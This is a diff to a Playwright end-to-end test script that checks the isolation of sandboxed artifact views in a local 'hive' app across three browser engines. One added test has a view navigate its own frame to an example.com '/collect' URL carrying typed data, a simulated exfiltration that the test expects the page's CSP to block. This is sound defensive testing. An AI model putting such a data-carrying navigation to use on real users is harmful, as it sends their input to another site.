@@ -1,5 +1,6 @@
 /**
- * Artifact views end to end on a running local hive, in a real Chromium: a mind saves a view written in MeTTa (the way
+ * Artifact views end to end on a running local hive, in a real browser, Chromium, Firefox or WebKit (--engine, Chromium
+ * when absent): a mind saves a view written in MeTTa (the way
  * minds are taught to write one), two HTML views (one written by hand, one built on the official MCP Apps SDK) and a
  * plan, and names the views, the plan and an id that names nothing in its chat; the check opens them on Artifacts, in
  * the chat, and fullscreen, and proves what the design promises:
@@ -7,10 +8,12 @@
  *     types, and takes up its mind's change as the mind saves it, keeping what was typed, with no reload; its MeTTa runs
  *     in a worker the hive serves with no network and no code generation;
  *   - isolation: the view's origin is opaque; it cannot read the hive page, its storage (where the token lives) or its
- *     cookies; it cannot fetch the hive's API or an undeclared domain; its in-memory storage works;
+ *     cookies; it cannot fetch the hive's API or an undeclared domain; its in-memory storage works; a view that sends
+ *     its own frame to another site sends nothing (the page's frame-src 'self' blocks it, and the page hears so), and a
+ *     frame that loads a second page is closed, with Show it again;
  *   - conformance: the SDK view completes ui/initialize, gets the host context (capabilities, display modes, theme and
  *     style variables), has its tool call refused, resizes its frame, switches to fullscreen on request, opens a link
- *     and saves a file only through the confirmation the hive draws under it, and its message lands in the mind's
+ *     and saves a file only through the alertdialog the hive draws under it, and its message lands in the mind's
  *     message box, not sent;
  *   - the frame keeps its state across fullscreen and back;
  *   - the view a mind names sits under that message in its chat, and no artifact id reaches the person: each reads as
@@ -20,27 +23,30 @@
  * screenshots/ keeps them under (30-view-artifacts-desktop.png and the rest), so copying them there refreshes those.
  *
  * Usage (a disposable hive with invented content; the operator password in HIVE_CHECK_PASSWORD):
- *   node scripts/views-check.mjs --hive http://127.0.0.1:8871 --browser <chromium> --sdk <app-with-deps.js> --out <dir>
- * --only <words> runs just the checks whose names hold those words. Exits non-zero, naming every failed check, when any
- * check fails.
+ *   node scripts/views-check.mjs --hive http://127.0.0.1:8871 [--engine chromium|firefox|webkit] [--browser <executable>]
+ *     --sdk <app-with-deps.js> --out <dir>
+ * --browser runs that build of the engine; without it, the build playwright-core installs. --only <words> runs just the
+ * checks whose names hold those words. Exits non-zero, naming every failed check, when any check fails.
  */
 import assert from 'node:assert/strict'
 import { mkdir, readFile, writeFile } from 'node:fs/promises'
 import { dirname, resolve } from 'node:path'
 import { fileURLToPath } from 'node:url'
-import { chromium } from 'playwright-core'
+import { chromium, firefox, webkit } from 'playwright-core'
 
 const root = resolve(dirname(fileURLToPath(import.meta.url)), '..')
 const args = process.argv.slice(2)
 const flag = (name) => { const i = args.indexOf(name); return i < 0 ? null : args[i + 1] }
 const hive = (flag('--hive') ?? '').replace(/\/+$/, '')
+const engine = flag('--engine') ?? 'chromium'
+const browserType = { chromium, firefox, webkit }[engine]
 const browserPath = flag('--browser')
 const sdkPath = flag('--sdk')
 const out = resolve(flag('--out') ?? 'views-check-out')
 const password = process.env.HIVE_CHECK_PASSWORD
 // --only <words>: run just the checks whose names hold those words (the setup still runs), for a shorter loop while fixing one
 const only = flag('--only')
-assert(hive && browserPath && sdkPath && password, 'needs --hive, --browser, --sdk and HIVE_CHECK_PASSWORD')
+assert(hive && sdkPath && password && browserType, 'needs --hive, --sdk, HIVE_CHECK_PASSWORD, and --engine chromium, firefox or webkit')
 const SDK_URL = 'https://cdn.jsdelivr.net/npm/@modelcontextprotocol/ext-apps@2.0.4/dist/src/app-with-deps.js'
 const LINK_URL = 'https://modelcontextprotocol.io/extensions/apps'
 
@@ -96,7 +102,11 @@ const ANY_ID = /ar_[0-9a-f]{32}/
 const VIEW_WORKER_CSP = "default-src 'none'; script-src 'self'; connect-src 'none'"
 
 const sdkBody = await readFile(resolve(sdkPath))
-const browser = await chromium.launch({ executablePath: resolve(browserPath), headless: true, args: ['--use-angle=swiftshader', '--enable-unsafe-swiftshader'] })
+// Chromium draws with SwiftShader on a host without a GPU; the other engines need no flags
+const browser = await browserType.launch({ headless: true, ...(browserPath ? { executablePath: resolve(browserPath) } : {}),
+  ...(engine === 'chromium' ? { args: ['--use-angle=swiftshader', '--enable-unsafe-swiftshader'] } : {}) })
+const version = browser.version()
+console.log(`engine ${engine} ${version}`)
 const leaks = []
 async function open(viewport, mobile) {
   // no serviceWorkers option: blocking them makes Playwright probe navigator.serviceWorker in every frame, which throws
@@ -317,13 +327,13 @@ for (const [label, viewport, mobile] of [['1440x900', { width: 1440, height: 900
     await check('conformance: the official SDK view talks to the hive', async () => {
       await openOnArtifacts(page, 'Host check')
       // it declares cdn.jsdelivr.net for the SDK: until the person allows that for this version it reaches nothing
-      const reach = page.locator(`[data-view-reach="${sdk.id}"]`)
-      await reach.getByText(/This view asks to reach https:\/\/cdn\.jsdelivr\.net\./).waitFor({ timeout: WAIT })
+      const reach = page.locator(`dialog[data-view="${sdk.id}"]`).getByText(/^This view asks to reach https:\/\/cdn\.jsdelivr\.net\./)
+      await reach.waitFor({ timeout: WAIT })
       const closed = (await (await fetch((await waitFrame(page, sdk.id)).url())).headers.get('content-security-policy')) ?? ''
       assert(closed.includes("connect-src 'none'") && !closed.includes('jsdelivr'), closed)
       await reach.scrollIntoViewIfNeeded()
       await photograph(page, '35b-view-reach-desktop.png')
-      await reach.getByRole('button', { name: 'Allow for this version' }).click()
+      await page.locator(`dialog[data-view="${sdk.id}"]`).getByRole('button', { name: 'Allow for this version' }).click()
       await reach.waitFor({ state: 'detached', timeout: WAIT })
       await page.waitForFunction((id) => [...document.querySelectorAll('iframe')].some((f) => f.src.includes(`/api/views/${id}.`) && /\.1\.[A-Za-z0-9_-]+$/.test(f.src)), sdk.id, { timeout: WAIT })
       const frame = await waitFrame(page, sdk.id)
@@ -346,24 +356,61 @@ for (const [label, viewport, mobile] of [['1440x900', { width: 1440, height: 900
       await page.locator('dialog[data-view-mode="inline"]').waitFor()
       await frame.locator('#displayMode:text("inline")').waitFor()
       // a link: after a click in the view, the hive shows where it goes and the person opens it themselves
-      const offer = page.getByRole('alertdialog', { name: 'Open a link from the view' })
+      // (views.metta view-host's parts, under the frame)
+      const around = page.locator(`dialog[data-view="${sdk.id}"]`)
+      const offer = around.getByRole('alertdialog', { name: 'Open a link from the view' })
       await pressUntil(frame.locator('#link'), offer, 'open a link in the view')
-      assert.match(await offer.textContent(), /https:\/\/modelcontextprotocol\.io\/extensions\/apps/)
-      const [tab] = await Promise.all([page.context().waitForEvent('page', { timeout: WAIT }), offer.getByRole('link', { name: 'Open' }).click()])
+      assert.match(await offer.textContent(), /This view wants to open https:\/\/modelcontextprotocol\.io\/extensions\/apps/)
+      const [tab] = await Promise.all([page.context().waitForEvent('page', { timeout: WAIT }), offer.getByRole('button', { name: 'Open', exact: true }).click()])
       await tab.waitForURL(LINK_URL)
       await frame.locator('#linkAnswer:text("opened")').waitFor()
       await tab.close()
       // a file is saved only after the person says yes under the view
-      const ask = page.getByRole('alertdialog', { name: 'Save a file from the view' })
+      const ask = around.getByRole('alertdialog', { name: 'Save a file from the view' })
       await pressUntil(frame.locator('#save'), ask, 'save a file in the view')
       assert.match(await ask.textContent(), /Save split\.csv \(\d+ bytes\) from this view\?/)
-      const [saved] = await Promise.all([page.waitForEvent('download'), ask.getByRole('button', { name: 'Save' }).click()])
+      const [saved] = await Promise.all([page.waitForEvent('download'), ask.getByRole('button', { name: 'Save', exact: true }).click()])
       assert.equal(saved.suggestedFilename(), 'split.csv')
       await frame.locator('#saveAnswer:text("saved")').waitFor()
       await pressUntil(frame.locator('#send'), (timeout) => page.waitForURL(new RegExp(`#/dot/${wren.id}`), { timeout }), 'send to the mind in the view')
       const box = page.locator('textarea').first()
       await box.waitFor()
       assert.equal(await box.inputValue(), 'Make the tip 18% for four people.', 'the words wait in the message box, unsent')
+    })
+    // a frame the hive closed because it loaded a second page: MeTTa's notice in its place, and Show it again
+    const closedThenShown = async (picture) => {
+      const left = page.locator(`[data-view-left="${tip.id}"]`)
+      await left.getByText('Tip calculator tried to open another page in its place, so it was closed.').waitFor({ timeout: WAIT })
+      assert.equal(await page.locator(`dialog[data-view="${tip.id}"]`).count(), 0, 'the frame is gone')
+      if (picture) await photograph(page, picture)
+      await left.getByRole('button', { name: 'Show Tip calculator again' }).click()
+      await (await waitFrame(page, tip.id)).locator('#bill').waitFor({ timeout: WAIT })
+    }
+    await check('isolation: a view that sends its own frame to another site sends nothing', async () => {
+      await openOnArtifacts(page, 'Tip calculator')
+      const frame = await waitFrame(page, tip.id)
+      await settled(page, tip.id)
+      const before = leaks.length
+      // the hive page's own policy is what stops it: the page hears each frame-src violation of its CSP
+      await page.evaluate(() => {
+        window.__frameSrc = []
+        document.addEventListener('securitypolicyviolation', (e) => { if (e.effectiveDirective === 'frame-src') window.__frameSrc.push(e.blockedURI) })
+      })
+      // what a view could carry off is what the person typed into it
+      await frame.evaluate(() => { location.href = 'https://example.com/collect?held=120' }).catch(() => undefined)
+      await page.waitForFunction(() => window.__frameSrc.some((u) => u.startsWith('https://example.com')), null, { timeout: WAIT })
+      assert.deepEqual(leaks.slice(before), [], 'nothing left for another site')
+      // then each engine does its own thing with the frame: Chromium shows its error page in it and WebKit fires a
+      // second load, so the hive closes it; Firefox cancels the navigation, and the view stays as it was
+      if (engine === 'firefox') assert.equal(await frame.locator('#bill').count(), 1, 'the view keeps its own document')
+      else await closedThenShown(engine === 'chromium' ? `36-view-left-${size}.png` : null)
+    })
+    await check('isolation: a view whose frame loads a page of the hive\'s own origin is closed', async () => {
+      // frame-src 'self' lets the frame load the hive's own origin, so every engine loads the page: a second load
+      const frame = await waitFrame(page, tip.id)
+      await settled(page, tip.id)
+      await frame.evaluate(() => { location.href = '/api/health' }).catch(() => undefined)
+      await closedThenShown(null)
     })
   }
   await check(`${label}: the view sits under the mind's message in its chat`, async () => {
@@ -420,7 +467,10 @@ for (const [label, viewport, mobile] of [['1440x900', { width: 1440, height: 900
     }, tip.id)
     await log.locator('[data-artifact-ref]', { hasText: 'Shopping list' }).first().click()
     await page.waitForURL(new RegExp(`#/artifacts/${list.id}$`))
-    await page.getByRole('region', { name: 'Shopping list, revision 1' }).getByText('Soda water').waitFor()
+    // the reader's region is named by its title, the header MeTTa composes, with the revision line under it
+    const reader = page.getByRole('region', { name: 'Shopping list' })
+    await reader.getByText('Soda water').waitFor()
+    await reader.getByText(/^Revision 1, saved /).waitFor()
     // a link to one that is gone, or not shown to this person, says so on Artifacts, with no id in the words
     await visit(page, `/artifacts/${gone}`)
     await page.getByText('That artifact is no longer here, or not shown to you.').waitFor()
@@ -447,7 +497,7 @@ for (const [label, viewport, mobile] of [['1440x900', { width: 1440, height: 900
   await context.close()
 }
 await browser.close()
-await writeFile(resolve(out, 'views-check.json'), JSON.stringify({ hive, browser: browserPath, metta: mtip.id, tip: tip.id, sdk: sdk.id, results, repeated_clicks: repeats }, null, 1))
+await writeFile(resolve(out, 'views-check.json'), JSON.stringify({ hive, engine, version, browser: browserPath, metta: mtip.id, tip: tip.id, sdk: sdk.id, results, repeated_clicks: repeats }, null, 1))
 const failed = results.filter((r) => !r.ok)
 console.log(`views-check: ${results.length - failed.length} passed, ${failed.length} failed, ${repeats.length} click(s) pressed again`)
 process.exitCode = failed.length ? 1 : 0
